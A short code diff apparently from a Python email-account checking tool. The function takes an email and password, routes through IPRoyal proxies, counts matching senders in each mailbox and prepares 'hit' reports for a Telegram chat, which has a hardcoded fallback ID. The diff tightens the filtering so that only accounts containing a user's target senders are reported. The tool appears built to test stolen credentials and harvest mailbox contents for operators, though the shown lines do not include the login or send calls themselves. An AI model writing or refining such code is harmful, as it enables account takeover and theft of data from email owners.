@@ -767,6 +767,8 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
 
         if not user_targets_dict:
             # Fallback for old mode or single user testing
+            if not senders_found:
+                return # Skip if 0 targets matched
             fallback_cid = os.environ.get("TELEGRAM_CHAT_ID", "1016773223")
             formatted_senders = ", ".join([f"{a} ({c})" for a, c in senders_found.items()]) if senders_found else "N/A"
             hit_data = hit_global_data.copy()
@@ -783,10 +785,9 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
                             u_found[found_addr] = count
                             break
                             
-                # Solo notificar al usuario si la cuenta SÍ tiene al menos un remitente de los suyos, 
-                # Inform the user that the account works, even if they didn't specifically find their targets
+                # Solo notificar al usuario si la cuenta SÍ tiene al menos un remitente de los suyos
                 if not u_found and len(u_senders) > 0:
-                    pass
+                    continue
                 
                 formatted_u_senders = ", ".join([f"{a} ({c})" for a, c in u_found.items()]) if u_found else "N/A"
                 hit_data = hit_global_data.copy()
